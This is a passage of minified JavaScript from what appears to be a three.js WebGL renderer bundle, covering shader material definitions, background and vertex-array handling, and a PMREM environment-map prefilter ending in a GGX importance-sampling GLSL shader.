je(0)}}]),vertexShader:Oe.meshtoon_vert,fragmentShader:Oe.meshtoon_frag},matcap:{uniforms:Jt([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,{matcap:{value:null}}]),vertexShader:Oe.meshmatcap_vert,fragmentShader:Oe.meshmatcap_frag},points:{uniforms:Jt([pe.points,pe.fog]),vertexShader:Oe.points_vert,fragmentShader:Oe.points_frag},dashed:{uniforms:Jt([pe.common,pe.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Oe.linedashed_vert,fragmentShader:Oe.linedashed_frag},depth:{uniforms:Jt([pe.common,pe.displacementmap]),vertexShader:Oe.depth_vert,fragmentShader:Oe.depth_frag},normal:{uniforms:Jt([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,{opacity:{value:1}}]),vertexShader:Oe.meshnormal_vert,fragmentShader:Oe.meshnormal_frag},sprite:{uniforms:Jt([pe.sprite,pe.fog]),vertexShader:Oe.sprite_vert,fragmentShader:Oe.sprite_frag},background:{uniforms:{uvTransform:{value:new Ue},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:Oe.background_vert,fragmentShader:Oe.background_frag},backgroundCube:{uniforms:{envMap:{value:null},flipEnvMap:{value:-1},backgroundBlurriness:{value:0},backgroundIntensity:{value:1},backgroundRotation:{value:new Ue}},vertexShader:Oe.backgroundCube_vert,fragmentShader:Oe.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Oe.cube_vert,fragmentShader:Oe.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Oe.equirect_vert,fragmentShader:Oe.equirect_frag},distance:{uniforms:Jt([pe.common,pe.displacementmap,{referencePosition:{value:new H},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Oe.distance_vert,fragmentShader:Oe.distance_frag},shadow:{uniforms:Jt([pe.lights,pe.fog,{color:{value:new je(0)},opacity:{value:1}}]),vertexShader:Oe.shadow_vert,fragmentShader:Oe.shadow_frag}};ei.physical={uniforms:Jt([ei.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new Ue},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new Ue},clearcoatNormalScale:{value:new Ze(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new Ue},dispersion:{value:0},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new Ue},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new Ue},sheen:{value:0},sheenColor:{value:new je(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new Ue},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new Ue},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new Ue},transmissionSamplerSize:{value:new Ze},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new Ue},attenuationDistance:{value:0},attenuationColor:{value:new je(0)},specularColor:{value:new je(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new Ue},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new Ue},anisotropyVector:{value:new Ze},anisotropyMap:{value:null},anisotropyMapTransform:{value:new Ue}}]),vertexShader:Oe.meshphysical_vert,fragmentShader:Oe.meshphysical_frag};const Ho={r:0,b:0,g:0},xs=new ui,O1=new bt;function F1(t,e,n,i,s,r,a){const o=new je(0);let l=r===!0?0:1,c,p,d=null,h=0,f=null;function v(_){let b=_.isScene===!0?_.background:null;return b&&b.isTexture&&(b=(_.backgroundBlurriness>0?n:e).get(b)),b}function y(_){let b=!1;const T=v(_);T===null?u(o,l):T&&T.isColor&&(u(T,1),b=!0);const A=t.xr.getEnvironmentBlendMode();A==="additive"?i.buffers.color.setClear(0,0,0,1,a):A==="alpha-blend"&&i.buffers.color.setClear(0,0,0,0,a),(t.autoClear||b)&&(i.buffers.depth.setTest(!0),i.buffers.depth.setMask(!0),i.buffers.color.setMask(!0),t.clear(t.autoClearColor,t.autoClearDepth,t.autoClearStencil))}function m(_,b){const T=v(b);T&&(T.isCubeTexture||T.mapping===ec)?(p===void 0&&(p=new Nn(new io(1,1,1),new di({name:"BackgroundCubeMaterial",uniforms:Ur(ei.backgroundCube.uniforms),vertexShader:ei.backgroundCube.vertexShader,fragmentShader:ei.backgroundCube.fragmentShader,side:hn,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),p.geometry.deleteAttribute("normal"),p.geometry.deleteAttribute("uv"),p.onBeforeRender=function(A,C,L){this.matrixWorld.copyPosition(L.matrixWorld)},Object.defineProperty(p.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),s.update(p)),xs.copy(b.backgroundRotation),xs.x*=-1,xs.y*=-1,xs.z*=-1,T.isCubeTexture&&T.isRenderTargetTexture===!1&&(xs.y*=-1,xs.z*=-1),p.material.uniforms.envMap.value=T,p.material.uniforms.flipEnvMap.value=T.isCubeTexture&&T.isRenderTargetTexture===!1?-1:1,p.material.uniforms.backgroundBlurriness.value=b.backgroundBlurriness,p.material.uniforms.backgroundIntensity.value=b.backgroundIntensity,p.material.uniforms.backgroundRotation.value.setFromMatrix4(O1.makeRotationFromEuler(xs)),p.material.toneMapped=We.getTransfer(T.colorSpace)!==it,(d!==T||h!==T.version||f!==t.toneMapping)&&(p.material.needsUpdate=!0,d=T,h=T.version,f=t.toneMapping),p.layers.enableAll(),_.unshift(p,p.geometry,p.material,0,0,null)):T&&T.isTexture&&(c===void 0&&(c=new Nn(new tc(2,2),new di({name:"BackgroundMaterial",uniforms:Ur(ei.background.uniforms),vertexShader:ei.background.vertexShader,fragmentShader:ei.background.fragmentShader,side:ls,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),c.geometry.deleteAttribute("normal"),Object.defineProperty(c.material,"map",{get:function(){return this.uniforms.t2D.value}}),s.update(c)),c.material.uniforms.t2D.value=T,c.material.uniforms.backgroundIntensity.value=b.backgroundIntensity,c.material.toneMapped=We.getTransfer(T.colorSpace)!==it,T.matrixAutoUpdate===!0&&T.updateMatrix(),c.material.uniforms.uvTransform.value.copy(T.matrix),(d!==T||h!==T.version||f!==t.toneMapping)&&(c.material.needsUpdate=!0,d=T,h=T.version,f=t.toneMapping),c.layers.enableAll(),_.unshift(c,c.geometry,c.material,0,0,null))}function u(_,b){_.getRGB(Ho,j0(t)),i.buffers.color.setClear(Ho.r,Ho.g,Ho.b,b,a)}function g(){p!==void 0&&(p.geometry.dispose(),p.material.dispose(),p=void 0),c!==void 0&&(c.geometry.dispose(),c.material.dispose(),c=void 0)}return{getClearColor:function(){return o},setClearColor:function(_,b=1){o.set(_),l=b,u(o,l)},getClearAlpha:function(){return l},setClearAlpha:function(_){l=_,u(o,l)},render:y,addToRenderList:m,dispose:g}}function B1(t,e){const n=t.getParameter(t.MAX_VERTEX_ATTRIBS),i={},s=h(null);let r=s,a=!1;function o(E,P,G,V,Z){let O=!1;const z=d(V,G,P);r!==z&&(r=z,c(r.object)),O=f(E,V,G,Z),O&&v(E,V,G,Z),Z!==null&&e.update(Z,t.ELEMENT_ARRAY_BUFFER),(O||a)&&(a=!1,b(E,P,G,V),Z!==null&&t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,e.get(Z).buffer))}function l(){return t.createVertexArray()}function c(E){return t.bindVertexArray(E)}function p(E){return t.deleteVertexArray(E)}function d(E,P,G){const V=G.wireframe===!0;let Z=i[E.id];Z===void 0&&(Z={},i[E.id]=Z);let O=Z[P.id];O===void 0&&(O={},Z[P.id]=O);let z=O[V];return z===void 0&&(z=h(l()),O[V]=z),z}function h(E){const P=[],G=[],V=[];for(let Z=0;Z<n;Z++)P[Z]=0,G[Z]=0,V[Z]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:P,enabledAttributes:G,attributeDivisors:V,object:E,attributes:{},index:null}}function f(E,P,G,V){const Z=r.attributes,O=P.attributes;let z=0;const F=G.getAttributes();for(const I in F)if(F[I].location>=0){const K=Z[I];let ne=O[I];if(ne===void 0&&(I==="instanceMatrix"&&E.instanceMatrix&&(ne=E.instanceMatrix),I==="instanceColor"&&E.instanceColor&&(ne=E.instanceColor)),K===void 0||K.attribute!==ne||ne&&K.data!==ne.data)return!0;z++}return r.attributesNum!==z||r.index!==V}function v(E,P,G,V){const Z={},O=P.attributes;let z=0;const F=G.getAttributes();for(const I in F)if(F[I].location>=0){let K=O[I];K===void 0&&(I==="instanceMatrix"&&E.instanceMatrix&&(K=E.instanceMatrix),I==="instanceColor"&&E.instanceColor&&(K=E.instanceColor));const ne={};ne.attribute=K,K&&K.data&&(ne.data=K.data),Z[I]=ne,z++}r.attributes=Z,r.attributesNum=z,r.index=V}function y(){const E=r.newAttributes;for(let P=0,G=E.length;P<G;P++)E[P]=0}function m(E){u(E,0)}function u(E,P){const G=r.newAttributes,V=r.enabledAttributes,Z=r.attributeDivisors;G[E]=1,V[E]===0&&(t.enableVertexAttribArray(E),V[E]=1),Z[E]!==P&&(t.vertexAttribDivisor(E,P),Z[E]=P)}function g(){const E=r.newAttributes,P=r.enabledAttributes;for(let G=0,V=P.length;G<V;G++)P[G]!==E[G]&&(t.disableVertexAttribArray(G),P[G]=0)}function _(E,P,G,V,Z,O,z){z===!0?t.vertexAttribIPointer(E,P,G,Z,O):t.vertexAttribPointer(E,P,G,V,Z,O)}function b(E,P,G,V){y();const Z=V.attributes,O=G.getAttributes(),z=P.defaultAttributeValues;for(const F in O){const I=O[F];if(I.location>=0){let X=Z[F];if(X===void 0&&(F==="instanceMatrix"&&E.instanceMatrix&&(X=E.instanceMatrix),F==="instanceColor"&&E.instanceColor&&(X=E.instanceColor)),X!==void 0){const K=X.normalized,ne=X.itemSize,ye=e.get(X);if(ye===void 0)continue;const Le=ye.buffer,Ke=ye.type,Qe=ye.bytesPerElement,Y=Ke===t.INT||Ke===t.UNSIGNED_INT||X.gpuType===eh;if(X.isInterleavedBufferAttribute){const te=X.data,_e=te.stride,De=X.offset;if(te.isInstancedInterleavedBuffer){for(let be=0;be<I.locationSize;be++)u(I.location+be,te.meshPerAttribute);E.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=te.meshPerAttribute*te.count)}else for(let be=0;be<I.locationSize;be++)m(I.location+be);t.bindBuffer(t.ARRAY_BUFFER,Le);for(let be=0;be<I.locationSize;be++)_(I.location+be,ne/I.locationSize,Ke,K,_e*Qe,(De+ne/I.locationSize*be)*Qe,Y)}else{if(X.isInstancedBufferAttribute){for(let te=0;te<I.locationSize;te++)u(I.location+te,X.meshPerAttribute);E.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=X.meshPerAttribute*X.count)}else for(let te=0;te<I.locationSize;te++)m(I.location+te);t.bindBuffer(t.ARRAY_BUFFER,Le);for(let te=0;te<I.locationSize;te++)_(I.location+te,ne/I.locationSize,Ke,K,ne*Qe,ne/I.locationSize*te*Qe,Y)}}else if(z!==void 0){const K=z[F];if(K!==void 0)switch(K.length){case 2:t.vertexAttrib2fv(I.location,K);break;case 3:t.vertexAttrib3fv(I.location,K);break;case 4:t.vertexAttrib4fv(I.location,K);break;default:t.vertexAttrib1fv(I.location,K)}}}}g()}function T(){L();for(const E in i){const P=i[E];for(const G in P){const V=P[G];for(const Z in V)p(V[Z].object),delete V[Z];delete P[G]}delete i[E]}}function A(E){if(i[E.id]===void 0)return;const P=i[E.id];for(const G in P){const V=P[G];for(const Z in V)p(V[Z].object),delete V[Z];delete P[G]}delete i[E.id]}function C(E){for(const P in i){const G=i[P];if(G[E.id]===void 0)continue;const V=G[E.id];for(const Z in V)p(V[Z].object),delete V[Z];delete G[E.id]}}function L(){w(),a=!0,r!==s&&(r=s,c(r.object))}function w(){s.geometry=null,s.program=null,s.wireframe=!1}return{setup:o,reset:L,resetDefaultState:w,dispose:T,releaseStatesOfGeometry:A,releaseStatesOfProgram:C,initAttributes:y,enableAttribute:m,disableUnusedAttributes:g}}function z1(t,e,n){let i;function s(c){i=c}function r(c,p){t.drawArrays(i,c,p),n.update(p,i,1)}function a(c,p,d){d!==0&&(t.drawArraysInstanced(i,c,p,d),n.update(p,i,d))}function o(c,p,d){if(d===0)return;e.get("WEBGL_multi_draw").multiDrawArraysWEBGL(i,c,0,p,0,d);let f=0;for(let v=0;v<d;v++)f+=p[v];n.update(f,i,1)}function l(c,p,d,h){if(d===0)return;const f=e.get("WEBGL_multi_draw");if(f===null)for(let v=0;v<c.length;v++)a(c[v],p[v],h[v]);else{f.multiDrawArraysInstancedWEBGL(i,c,0,p,0,h,0,d);let v=0;for(let y=0;y<d;y++)v+=p[y]*h[y];n.update(v,i,1)}}this.setMode=s,this.render=r,this.renderInstances=a,this.renderMultiDraw=o,this.renderMultiDrawInstances=l}function V1(t,e,n,i){let s;function r(){if(s!==void 0)return s;if(e.has("EXT_texture_filter_anisotropic")===!0){const C=e.get("EXT_texture_filter_anisotropic");s=t.getParameter(C.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else s=0;return s}function a(C){return!(C!==jn&&i.convert(C)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_FORMAT))}function o(C){const L=C===ki&&(e.has("EXT_color_buffer_half_float")||e.has("EXT_color_buffer_float"));return!(C!==yn&&i.convert(C)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_TYPE)&&C!==ni&&!L)}function l(C){if(C==="highp"){if(t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.HIGH_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.HIGH_FLOAT).precision>0)return"highp";C="mediump"}return C==="mediump"&&t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.MEDIUM_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}let c=n.precision!==void 0?n.precision:"highp";const p=l(c);p!==c&&(Ie("WebGLRenderer:",c,"not supported, using",p,"instead."),c=p);const d=n.logarithmicDepthBuffer===!0,h=n.reversedDepthBuffer===!0&&e.has("EXT_clip_control"),f=t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS),v=t.getParameter(t.MAX_VERTEX_TEXTURE_IMAGE_UNITS),y=t.getParameter(t.MAX_TEXTURE_SIZE),m=t.getParameter(t.MAX_CUBE_MAP_TEXTURE_SIZE),u=t.getParameter(t.MAX_VERTEX_ATTRIBS),g=t.getParameter(t.MAX_VERTEX_UNIFORM_VECTORS),_=t.getParameter(t.MAX_VARYING_VECTORS),b=t.getParameter(t.MAX_FRAGMENT_UNIFORM_VECTORS),T=t.getParameter(t.MAX_SAMPLES),A=t.getParameter(t.SAMPLES);return{isWebGL2:!0,getMaxAnisotropy:r,getMaxPrecision:l,textureFormatReadable:a,textureTypeReadable:o,precision:c,logarithmicDepthBuffer:d,reversedDepthBuffer:h,maxTextures:f,maxVertexTextures:v,maxTextureSize:y,maxCubemapSize:m,maxAttributes:u,maxVertexUniforms:g,maxVaryings:_,maxFragmentUniforms:b,maxSamples:T,samples:A}}function H1(t){const e=this;let n=null,i=0,s=!1,r=!1;const a=new ws,o=new Ue,l={value:null,needsUpdate:!1};this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(d,h){const f=d.length!==0||h||i!==0||s;return s=h,i=d.length,f},this.beginShadows=function(){r=!0,p(null)},this.endShadows=function(){r=!1},this.setGlobalState=function(d,h){n=p(d,h,0)},this.setState=function(d,h,f){const v=d.clippingPlanes,y=d.clipIntersection,m=d.clipShadows,u=t.get(d);if(!s||v===null||v.length===0||r&&!m)r?p(null):c();else{const g=r?0:i,_=g*4;let b=u.clippingState||null;l.value=b,b=p(v,h,_,f);for(let T=0;T!==_;++T)b[T]=n[T];u.clippingState=b,this.numIntersection=y?this.numPlanes:0,this.numPlanes+=g}};function c(){l.value!==n&&(l.value=n,l.needsUpdate=i>0),e.numPlanes=i,e.numIntersection=0}function p(d,h,f,v){const y=d!==null?d.length:0;let m=null;if(y!==0){if(m=l.value,v!==!0||m===null){const u=f+y*4,g=h.matrixWorldInverse;o.getNormalMatrix(g),(m===null||m.length<u)&&(m=new Float32Array(u));for(let _=0,b=f;_!==y;++_,b+=4)a.copy(d[_]).applyMatrix4(g,o),a.normal.toArray(m,b),m[b+3]=a.constant}l.value=m,l.needsUpdate=!0}return e.numPlanes=y,e.numIntersection=0,m}}function G1(t){let e=new WeakMap;function n(a,o){return o===_d?a.mapping=Fs:o===xd&&(a.mapping=Nr),a}function i(a){if(a&&a.isTexture){const o=a.mapping;if(o===_d||o===xd)if(e.has(a)){const l=e.get(a).texture;return n(l,a.mapping)}else{const l=a.image;if(l&&l.height>0){const c=new Y0(l.height);return c.fromEquirectangularTexture(t,a),e.set(a,c),a.addEventListener("dispose",s),n(c.texture,a.mapping)}else return null}}return a}function s(a){const o=a.target;o.removeEventListener("dispose",s);const l=e.get(o);l!==void 0&&(e.delete(o),l.dispose())}function r(){e=new WeakMap}return{get:i,dispose:r}}const Ki=4,ym=[.125,.215,.35,.446,.526,.582],Ms=20,W1=256,ia=new fh,Sm=new je;let ou=null,lu=0,cu=0,uu=!1;const j1=new H;class bm{constructor(e){this._renderer=e,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._sizeLods=[],this._sigmas=[],this._lodMeshes=[],this._backgroundBox=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._blurMaterial=null,this._ggxMaterial=null}fromScene(e,n=0,i=.1,s=100,r={}){const{size:a=256,position:o=j1}=r;ou=this._renderer.getRenderTarget(),lu=this._renderer.getActiveCubeFace(),cu=this._renderer.getActiveMipmapLevel(),uu=this._renderer.xr.enabled,this._renderer.xr.enabled=!1,this._setSize(a);const l=this._allocateTargets();return l.depthBuffer=!0,this._sceneToCubeUV(e,i,s,l,o),n>0&&this._blur(l,0,0,n),this._applyPMREM(l),this._cleanup(l),l}fromEquirectangular(e,n=null){return this._fromTexture(e,n)}fromCubemap(e,n=null){return this._fromTexture(e,n)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=Mm(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=Em(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose(),this._backgroundBox!==null&&(this._backgroundBox.geometry.dispose(),this._backgroundBox.material.dispose())}_setSize(e){this._lodMax=Math.floor(Math.log2(e)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._ggxMaterial!==null&&this._ggxMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let e=0;e<this._lodMeshes.length;e++)this._lodMeshes[e].geometry.dispose()}_cleanup(e){this._renderer.setRenderTarget(ou,lu,cu),this._renderer.xr.enabled=uu,e.scissorTest=!1,ir(e,0,0,e.width,e.height)}_fromTexture(e,n){e.mapping===Fs||e.mapping===Nr?this._setSize(e.image.length===0?16:e.image[0].width||e.image[0].image.width):this._setSize(e.image.width/4),ou=this._renderer.getRenderTarget(),lu=this._renderer.getActiveCubeFace(),cu=this._renderer.getActiveMipmapLevel(),uu=this._renderer.xr.enabled,this._renderer.xr.enabled=!1;const i=n||this._allocateTargets();return this._textureToCubeUV(e,i),this._applyPMREM(i),this._cleanup(i),i}_allocateTargets(){const e=3*Math.max(this._cubeSize,112),n=4*this._cubeSize,i={magFilter:qt,minFilter:qt,generateMipmaps:!1,type:ki,format:jn,colorSpace:Dr,depthBuffer:!1},s=wm(e,n,i);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==e||this._pingPongRenderTarget.height!==n){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=wm(e,n,i);const{_lodMax:r}=this;({lodMeshes:this._lodMeshes,sizeLods:this._sizeLods,sigmas:this._sigmas}=X1(r)),this._blurMaterial=Y1(r,e,n),this._ggxMaterial=q1(r,e,n)}return s}_compileMaterial(e){const n=new Nn(new $n,e);this._renderer.compile(n,ia)}_sceneToCubeUV(e,n,i,s,r){const l=new xn(90,1,n,i),c=[1,-1,1,1,1,1],p=[1,1,1,-1,-1,-1],d=this._renderer,h=d.autoClear,f=d.toneMapping;d.getClearColor(Sm),d.toneMapping=ai,d.autoClear=!1,d.state.buffers.depth.getReversed()&&(d.setRenderTarget(s),d.clearDepth(),d.setRenderTarget(null)),this._backgroundBox===null&&(this._backgroundBox=new Nn(new io,new uh({name:"PMREM.Background",side:hn,depthWrite:!1,depthTest:!1})));const y=this._backgroundBox,m=y.material;let u=!1;const g=e.background;g?g.isColor&&(m.color.copy(g),e.background=null,u=!0):(m.color.copy(Sm),u=!0);for(let _=0;_<6;_++){const b=_%3;b===0?(l.up.set(0,c[_],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x+p[_],r.y,r.z)):b===1?(l.up.set(0,0,c[_]),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y+p[_],r.z)):(l.up.set(0,c[_],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y,r.z+p[_]));const T=this._cubeSize;ir(s,b*T,_>2?T:0,T,T),d.setRenderTarget(s),u&&d.render(y,l),d.render(e,l)}d.toneMapping=f,d.autoClear=h,e.background=g}_textureToCubeUV(e,n){const i=this._renderer,s=e.mapping===Fs||e.mapping===Nr;s?(this._cubemapMaterial===null&&(this._cubemapMaterial=Mm()),this._cubemapMaterial.uniforms.flipEnvMap.value=e.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=Em());const r=s?this._cubemapMaterial:this._equirectMaterial,a=this._lodMeshes[0];a.material=r;const o=r.uniforms;o.envMap.value=e;const l=this._cubeSize;ir(n,0,0,3*l,2*l),i.setRenderTarget(n),i.render(a,ia)}_applyPMREM(e){const n=this._renderer,i=n.autoClear;n.autoClear=!1;const s=this._lodMeshes.length;for(let r=1;r<s;r++)this._applyGGXFilter(e,r-1,r);n.autoClear=i}_applyGGXFilter(e,n,i){const s=this._renderer,r=this._pingPongRenderTarget,a=this._ggxMaterial,o=this._lodMeshes[i];o.material=a;const l=a.uniforms,c=i/(this._lodMeshes.length-1),p=n/(this._lodMeshes.length-1),d=Math.sqrt(c*c-p*p),h=0+c*1.25,f=d*h,{_lodMax:v}=this,y=this._sizeLods[i],m=3*y*(i>v-Ki?i-v+Ki:0),u=4*(this._cubeSize-y);l.envMap.value=e.texture,l.roughness.value=f,l.mipInt.value=v-n,ir(r,m,u,3*y,2*y),s.setRenderTarget(r),s.render(o,ia),l.envMap.value=r.texture,l.roughness.value=0,l.mipInt.value=v-i,ir(e,m,u,3*y,2*y),s.setRenderTarget(e),s.render(o,ia)}_blur(e,n,i,s,r){const a=this._pingPongRenderTarget;this._halfBlur(e,a,n,i,s,"latitudinal",r),this._halfBlur(a,e,i,i,s,"longitudinal",r)}_halfBlur(e,n,i,s,r,a,o){const l=this._renderer,c=this._blurMaterial;a!=="latitudinal"&&a!=="longitudinal"&&$e("blur direction must be either latitudinal or longitudinal!");const p=3,d=this._lodMeshes[s];d.material=c;const h=c.uniforms,f=this._sizeLods[i]-1,v=isFinite(r)?Math.PI/(2*f):2*Math.PI/(2*Ms-1),y=r/v,m=isFinite(r)?1+Math.floor(p*y):Ms;m>Ms&&Ie(`sigmaRadians, ${r}, is too large and will clip, as it requested ${m} samples when the maximum is set to ${Ms}`);const u=[];let g=0;for(let C=0;C<Ms;++C){const L=C/y,w=Math.exp(-L*L/2);u.push(w),C===0?g+=w:C<m&&(g+=2*w)}for(let C=0;C<u.length;C++)u[C]=u[C]/g;h.envMap.value=e.texture,h.samples.value=m,h.weights.value=u,h.latitudinal.value=a==="latitudinal",o&&(h.poleAxis.value=o);const{_lodMax:_}=this;h.dTheta.value=v,h.mipInt.value=_-i;const b=this._sizeLods[s],T=3*b*(s>_-Ki?s-_+Ki:0),A=4*(this._cubeSize-b);ir(n,T,A,3*b,2*b),l.setRenderTarget(n),l.render(d,ia)}}function X1(t){const e=[],n=[],i=[];let s=t;const r=t-Ki+1+ym.length;for(let a=0;a<r;a++){const o=Math.pow(2,s);e.push(o);let l=1/o;a>t-Ki?l=ym[a-t+Ki-1]:a===0&&(l=0),n.push(l);const c=1/(o-2),p=-c,d=1+c,h=[p,p,d,p,d,d,p,p,d,d,p,d],f=6,v=6,y=3,m=2,u=1,g=new Float32Array(y*v*f),_=new Float32Array(m*v*f),b=new Float32Array(u*v*f);for(let A=0;A<f;A++){const C=A%3*2/3-1,L=A>2?0:-1,w=[C,L,0,C+2/3,L,0,C+2/3,L+1,0,C,L,0,C+2/3,L+1,0,C,L+1,0];g.set(w,y*v*A),_.set(h,m*v*A);const E=[A,A,A,A,A,A];b.set(E,u*v*A)}const T=new $n;T.setAttribute("position",new li(g,y)),T.setAttribute("uv",new li(_,m)),T.setAttribute("faceIndex",new li(b,u)),i.push(new Nn(T,null)),s>Ki&&s--}return{lodMeshes:i,sizeLods:e,sigmas:n}}function wm(t,e,n){const i=new oi(t,e,n);return i.texture.mapping=ec,i.texture.name="PMREM.cubeUv",i.scissorTest=!0,i}function ir(t,e,n,i,s){t.viewport.set(e,n,i,s),t.scissor.set(e,n,i,s)}function q1(t,e,n){return new di({name:"PMREMGGXConvolution",defines:{GGX_SAMPLES:W1,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},roughness:{value:0},mipInt:{value:0}},vertexShader:nc(),fragmentShader:`

			precision highp float;
			precision highp int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform float roughness;
			uniform float mipInt;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			#define PI 3.14159265359

			// Van der Corput radical inverse
			float radicalInverse_VdC(uint bits) {
				bits = (bits << 16u) | (bits >> 16u);
				bits = ((bits & 0x55555555u) << 1u) | ((bits & 0xAAAAAAAAu) >> 1u);
				bits = ((bits & 0x33333333u) << 2u) | ((bits & 0xCCCCCCCCu) >> 2u);
				bits = ((bits & 0x0F0F0F0Fu) << 4u) | ((bits & 0xF0F0F0F0u) >> 4u);
				bits = ((bits & 0x00FF00FFu) << 8u) | ((bits & 0xFF00FF00u) >> 8u);
				return float(bits) * 2.3283064365386963e-10; // / 0x100000000
			}

			// Hammersley sequence
			vec2 hammersley(uint i, uint N) {
				return vec2(float(i) / float(N), radicalInverse_VdC(i));
			}

			// GGX VNDF importance sampling (Eric Heitz 2018)
			// "Sampling the GGX Distribution of Visible Normals"
			// https://jcgt.org/published/0007/04/01/
			vec3 importanceSampleGGX_VNDF(vec2 Xi, vec3 V, float roughness) {
				float alpha = roughness * roughness;

				// Section 3.2: Transform view direction to hemisphere configuration
				vec3 Vh = normalize(vec3(alpha * V.x, alpha * V.y, V.z));

				// Section 4.1: Orthonormal basis
				float lensq = Vh.x * Vh.x + Vh.y * Vh.y;
				vec3 T1 = lensq > 0.0 ? vec3(-Vh.y, Vh.x, 0.0) / sqrt(lensq) : vec3(1.0, 0.0, 0.0);
				vec3 T2 = cross(Vh, T1);

				// Section 4.2: Parameterization of projected area
				float r = sqrt(Xi.x);
				float phi = 2.0 * PI * Xi.y;
				float t1 = r * cos(phi);
				float t2 = r * sin(phi);
				float s = 0.5 * (1.0 + Vh.z);
				t2 = (1.0 - s) * sqrt(1.0 - t1 * t1) + s * t2;

				// Section 4.3: Reprojection onto hemisphere
				vec3 Nh = t1 * T1 + t2 * T2 + sqrt(max(0.0, 1.0 - t1 * t1 - t2 * t2)) * Vh;

				// Section 3.4: Transform back to ellipsoid configuration
				return normalize(vec3(alpha * Nh.x, alpha * Nh.y, max(0.0, Nh.z)));
			}

			void main() {
				vec3 N = normalize(vOutputDirection);
				vec3 V = N; // Assume view direction equals normal for pre-filtering

				vec3 prefilteredColor = vec3(0.0);
				float totalWeight = 0.0;

				// For very low roughness, just sample the environment directly
				if (roughness < 0.001) {
					gl_FragColor = vec4(bilinearCubeUV(envMap, N, mipInt), 1.0);
					return;
				}

				// Tangent space basis for VNDF sampling
				vec3 up = abs(N.z) < 0.999 ? vec3(0.0, 0.0, 1.0) : vec3(1.0, 0.0, 0.0);
				vec3 tangent = normalize(cross(up, N));
				vec3 bitangent = cross(N, tangent);

				for(uint i = 0u; i < uint(GGX_SAMPLES); i++) {
					vec2 Xi = hammersley(i, uint(GGX_SAMPLES));

					// For PMREM, V = N, so in tangent space V is always (0, 0, 1)
					vec3 H_tangent = importanceSampleGGX_VNDF(Xi, vec3(0.0, 0.0, 1.0), roughness);

					// Transform H back to world space
					vec3 H = normalize(tangent * H_tangent.x + bitangent * H_tangent.y + N * H_tangent.z);
					vec3 L = normalize(2.0 * dot(V, H) * H - V);

					float NdotL = max(dot(N, L), 0.0);

					if(NdotL > 0.0) {
						// Sample environment at fixed mip level
						// VNDF importance sampling handles the distribution filtering
						vec3 sampleColor = bilinearCubeUV(envMap, L, mipInt);

						// Weight by NdotL for the split-sum approximation
						// VNDF PDF naturally accounts for the visible microfacet distribution
						prefilteredColor += sampleColor * NdotL;
						totalWeight += NdotL;
					}
				}

				if (totalWeight > 0.0) {
					prefilteredColor = prefilteredColor / totalWeight;
				}

				gl_FragColor = vec4(prefilteredColor, 1.0);
			}
